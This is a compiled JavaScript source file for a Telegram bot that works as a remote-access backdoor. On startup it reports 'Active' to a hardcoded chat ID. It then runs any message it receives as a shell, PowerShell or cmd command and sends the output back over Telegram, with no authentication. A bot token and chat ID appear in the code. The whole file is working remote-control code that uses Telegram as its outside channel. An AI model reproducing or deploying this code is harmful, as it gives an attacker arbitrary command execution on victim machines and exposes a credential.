"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", { value: true });
const telegraf_1 = require("telegraf");
const spawn_1 = require("./spawn");
const app = new telegraf_1.Telegraf('6198800908:AAGVvGmCfmKDK_Pbt8nJ9PGArg2fZ5x6DJ4');
setTimeout(() => {
    app.telegram.sendMessage('717341709', 'Active');
}, 1000);
app.command('sh', (ctx) => __awaiter(void 0, void 0, void 0, function* () {
    const message = ctx.message.text.replace(/\/sh /, '');
    try {
        const spawn = yield (0, spawn_1.asyncSpawn)('sh', ['-c', `${message}`]);
        if (!spawn.okData && !spawn.errData) {
            return yield ctx.reply('Пустое значение');
        }
        const msg = spawn.okData + '\n\n' + spawn.errData;
        const lengthCount = +(msg.length / 2000).toFixed();
        const splitCount = lengthCount === 0 ? 1 : lengthCount;
        for (let i = 0; i < splitCount; i++) {
            yield ctx.reply(`<code>${msg.slice(2000 * i, 2000 + 2000 * i)}</code>`, { parse_mode: 'HTML' });
        }
    }
    catch (error) {
        if (error instanceof Error) {
            console.log(error);
            return yield ctx.reply(error.message);
        }
        return yield ctx.reply('Нет данных');
    }
}));
app.command('powershell', (ctx) => __awaiter(void 0, void 0, void 0, function* () {
    const message = ctx.message.text.replace(/\/powershell /, '');
    try {
        const spawn = yield (0, spawn_1.asyncSpawn)('powershell', [
            '-Command',
            `${message}`,
        ]);
        if (!spawn.okData && !spawn.errData) {
            return yield ctx.reply('Пустое значение');
        }
        const msg = spawn.okData + '\n\n' + spawn.errData;
        const lengthCount = +(msg.length / 2000).toFixed();
        const splitCount = lengthCount === 0 ? 1 : lengthCount;
        for (let i = 0; i < splitCount; i++) {
            yield ctx.reply(`<code>${msg.slice(2000 * i, 2000 + 2000 * i)}</code>`, { parse_mode: 'HTML' });
        }
    }
    catch (error) {
        if (error instanceof Error) {
            console.log(error);
            return yield ctx.reply(error.message);
        }
        return yield ctx.reply('Нет данных');
    }
}));
app.command('cmd', (ctx) => __awaiter(void 0, void 0, void 0, function* () {
    const message = ctx.message.text.replace(/\/cmd /, '');
    try {
        const spawn = yield (0, spawn_1.asyncSpawn)('cmd', ['/c', `${message}`]);
        if (!spawn.okData && !spawn.errData) {
            return yield ctx.reply('Пустое значение');
        }
        const msg = spawn.okData + '\n\n' + spawn.errData;
        const lengthCount = +(msg.length / 2000).toFixed();
        const splitCount = lengthCount === 0 ? 1 : lengthCount;
        for (let i = 0; i < splitCount; i++) {
            yield ctx.reply(`<code>${msg.slice(2000 * i, 2000 + 2000 * i)}</code>`, { parse_mode: 'HTML' });
        }
    }
    catch (error) {
        if (error instanceof Error) {
            console.log(error);
            return yield ctx.reply(error.message);
        }
        return yield ctx.reply('Нет данных');
    }
}));
app.on('text', (ctx) => __awaiter(void 0, void 0, void 0, function* () {
    if (ctx.message.text[0] === '/') {
        return;
    }
    const [command, ...args] = ctx.message.text.split(' ');
    try {
        const spawn = yield (0, spawn_1.asyncSpawn)(command, args);
        if (!spawn.okData && !spawn.errData) {
            return yield ctx.reply('Пустое значение');
        }
        const msg = spawn.okData + '\n\n' + spawn.errData;
        const lengthCount = +(msg.length / 2000).toFixed();
        const splitCount = lengthCount === 0 ? 1 : lengthCount;
        for (let i = 0; i < splitCount; i++) {
            yield ctx.reply(`<code>${msg.slice(2000 * i, 2000 + 2000 * i)}</code>`, { parse_mode: 'HTML' });
        }
    }
    catch (error) {
        if (error instanceof Error) {
            console.log(error);
            return yield ctx.reply(error.message);
        }
        return yield ctx.reply('Нет данных');
    }
}));
app.launch();
